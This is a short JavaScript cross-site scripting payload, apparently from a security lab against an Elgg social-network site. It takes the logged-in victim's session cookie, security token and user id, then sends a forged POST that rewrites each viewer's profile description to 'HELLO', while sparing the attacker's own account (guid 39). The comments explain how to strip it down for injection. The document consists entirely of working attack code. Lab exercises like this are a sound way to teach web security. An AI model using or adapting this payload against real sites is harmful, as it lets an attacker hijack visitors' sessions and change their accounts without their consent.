// In the standalone file, we need to remove all the comments, extra space, new-line characters, <script> and </script>
<script>
var Ajax=null;
// Construct the header information for the HTTP request
Ajax=new XMLHttpRequest();
Ajax.open("POST","http://www.xsslabelgg.com/action/profile/edit",true);
Ajax.setRequestHeader("Host","www.xsslabelgg.com");
Ajax.setRequestHeader("Keep-Alive","300");
Ajax.setRequestHeader("Connection","keep-alive");
Ajax.setRequestHeader("Cookie",document.cookie);
Ajax.setRequestHeader("Content-Type","application/x-www-form-urlencoded");
// Construct the content. The format of the content can be learned
// from LiveHTTPHeaders.
var token="__elgg_token=".concat(elgg.security.token.__elgg_token);
var ts="&__elgg_ts=".concat(elgg.security.token.__elgg_ts);
var user=elgg.get_logged_in_user_entity();
var name="&name=".concat(user.name);
var guid="&guid=".concat(user.guid);
var content=token.concat(ts).concat(name).concat("&description=%3Cp%3EHELLO%3C%2Fp%3E&accesslevel%5Bdescription%5D=2&briefdescription=&accesslevel%5Bbriefdescription%5D=2&location=&accesslevel%5Blocation%5D=2&interests=&accesslevel%5Binterests%5D=2&skills=&accesslevel%5Bskills%5D=2&contactemail=&accesslevel%5Bcontactemail%5D=2&phone=&accesslevel%5Bphone%5D=2&mobile=&accesslevel%5Bmobile%5D=2&website=&accesslevel%5Bwebsite%5D=2&twitter=&accesslevel%5Btwitter%5D=2").concat(guid);
// Send the HTTP POST request.
// We specify the guid because we don't want to modify the attacker's profile as well.
if(user.guid != 39){Ajax.send(content);}
</script>